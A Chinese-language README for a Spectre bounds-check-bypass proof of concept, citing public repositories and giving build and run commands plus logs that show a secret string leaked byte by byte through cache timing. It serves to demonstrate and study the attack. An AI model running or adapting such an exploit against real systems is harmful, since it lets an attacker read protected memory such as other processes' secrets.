# Bounds Check Bypass PoC
本项目通过 C 代码演示了经典的“边界检查绕过”（Bounds Check Bypass）侧信道攻击原理，即 Spectre 漏洞。攻击者可利用 CPU 的分支预测和缓存时序侧信道，越界读取受害者内存中的敏感数据。

## 说明
- 项目地址
    - [crozone/SpectrePoC](https://github.com/crozone/SpectrePoC)        
    - [isec-tugraz/transientfail](https://github.com/isec-tugraz/transientfail)
- 演示如何通过分支预测误导 CPU，利用缓存命中时间推测 secret 字符串内容。

## 依赖环境
- 支持 x86_64 指令集的处理器（建议 Intel 平台）
- 推荐Linux系统（master-v1.c中的fork函数仅限Linux系统）
- GCC 支持内联汇编（推荐使用 gcc 编译器）

- 支持 rdtscp, clflush, mfence 指令的处理器

## 编译
```bash
make           # 编译指定源文件（默认main.c）
make clean     # 清理中间文件
```

## 运行
运行程序可选指定缓存命中阈值，若不指定则自动检测：

```bash
./poc          # 使用内置阈值运行
./poc 100       # 手动设定阈值（推荐80~400之间尝试）
```
## 运行效果
程序运行后会逐字节恢复被保护的 "秘密" 数据（例如字符串 "INACCESSIBLE SECRET" 或 "The Magic Words..."），输出内容中会显示成功恢复的字符、ASCII 值、命中次数等信息。

### 针对 crozone/SpectrePoC
```TEXT
Using a cache hit threshold of 400.
Reading 40 bytes:
Reading at malicious_x = 0xffffffffffffe09b... Success: 0x54='T' count=11       (second best: 0xEE='?' count=3)
Reading at malicious_x = 0xffffffffffffe09c... Unclear: 0x68='h' count=982      (second best: 0x3E='>' count=671)
Reading at malicious_x = 0xffffffffffffe09d... Success: 0x65='e' count=7        (second best: 0xFC='?' count=1)
Reading at malicious_x = 0xffffffffffffe09e... Success: 0x20=' ' count=2
Reading at malicious_x = 0xffffffffffffe09f... Success: 0x4D='M' count=13       (second best: 0xEE='?' count=4)
Reading at malicious_x = 0xffffffffffffe0a0... Success: 0x61='a' count=7        (second best: 0xE5='?' count=1)
Reading at malicious_x = 0xffffffffffffe0a1... Success: 0x67='g' count=2
Reading at malicious_x = 0xffffffffffffe0a2... Success: 0x69='i' count=2
Reading at malicious_x = 0xffffffffffffe0a3... Success: 0x63='c' count=2
Reading at malicious_x = 0xffffffffffffe0a4... Success: 0x20=' ' count=2
Reading at malicious_x = 0xffffffffffffe0a5... Success: 0x57='W' count=15       (second best: 0x5F='_' count=5)
Reading at malicious_x = 0xffffffffffffe0a6... Success: 0x6F='o' count=17       (second best: 0xEE='?' count=6)
Reading at malicious_x = 0xffffffffffffe0a7... Success: 0x72='r' count=15       (second best: 0x47='G' count=5)
Reading at malicious_x = 0xffffffffffffe0a8... Success: 0x64='d' count=7        (second best: 0x47='G' count=1)
Reading at malicious_x = 0xffffffffffffe0a9... Success: 0x73='s' count=7        (second best: 0x95='?' count=1)
Reading at malicious_x = 0xffffffffffffe0aa... Success: 0x20=' ' count=2
Reading at malicious_x = 0xffffffffffffe0ab... Success: 0x61='a' count=7        (second best: 0x00='?' count=1)
Reading at malicious_x = 0xffffffffffffe0ac... Success: 0x72='r' count=13       (second best: 0x47='G' count=4)
Reading at malicious_x = 0xffffffffffffe0ad... Success: 0x65='e' count=7        (second best: 0xCF='?' count=1)
Reading at malicious_x = 0xffffffffffffe0ae... Success: 0x20=' ' count=7        (second best: 0xEE='?' count=1)
Reading at malicious_x = 0xffffffffffffe0af... Success: 0x53='S' count=13       (second best: 0xE4='?' count=4)
Reading at malicious_x = 0xffffffffffffe0b0... Unclear: 0x71='q' count=997      (second best: 0x74='t' count=582)
Reading at malicious_x = 0xffffffffffffe0b1... Success: 0x75='u' count=7        (second best: 0xCF='?' count=1)
Reading at malicious_x = 0xffffffffffffe0b2... Success: 0x65='e' count=7        (second best: 0xEE='?' count=1)
Reading at malicious_x = 0xffffffffffffe0b3... Success: 0x61='a' count=2
Reading at malicious_x = 0xffffffffffffe0b4... Success: 0x6D='m' count=2
Reading at malicious_x = 0xffffffffffffe0b5... Success: 0x69='i' count=2
Reading at malicious_x = 0xffffffffffffe0b6... Success: 0x73='s' count=9        (second best: 0x47='G' count=2)
Reading at malicious_x = 0xffffffffffffe0b7... Unclear: 0x68='h' count=989      (second best: 0x3E='>' count=613)
Reading at malicious_x = 0xffffffffffffe0b8... Success: 0x20=' ' count=7        (second best: 0xE5='?' count=1)
Reading at malicious_x = 0xffffffffffffe0b9... Success: 0x4F='O' count=33       (second best: 0xEE='?' count=14)
Reading at malicious_x = 0xffffffffffffe0ba... Success: 0x73='s' count=7        (second best: 0xCE='?' count=1)
Reading at malicious_x = 0xffffffffffffe0bb... Success: 0x73='s' count=2
Reading at malicious_x = 0xffffffffffffe0bc... Success: 0x69='i' count=7        (second best: 0xEE='?' count=1)
Reading at malicious_x = 0xffffffffffffe0bd... Success: 0x66='f' count=49       (second best: 0xEF='?' count=22)
Reading at malicious_x = 0xffffffffffffe0be... Success: 0x72='r' count=11       (second best: 0x47='G' count=3)
Reading at malicious_x = 0xffffffffffffe0bf... Success: 0x61='a' count=9        (second best: 0xE5='?' count=2)
Reading at malicious_x = 0xffffffffffffe0c0... Unclear: 0x67='g' count=996      (second best: 0x3C='<' count=566)
Reading at malicious_x = 0xffffffffffffe0c1... Success: 0x65='e' count=7        (second best: 0xEF='?' count=1)
Reading at malicious_x = 0xffffffffffffe0c2... Success: 0x2E='.' count=7        (second best: 0xE5='?' count=1)
```

### 针对 isec-tugraz/transientfail

```TEXT
[*] Flush+Reload Threshold: 400
[ ]  INACCESSIBLE SECRET

[>] Done
```
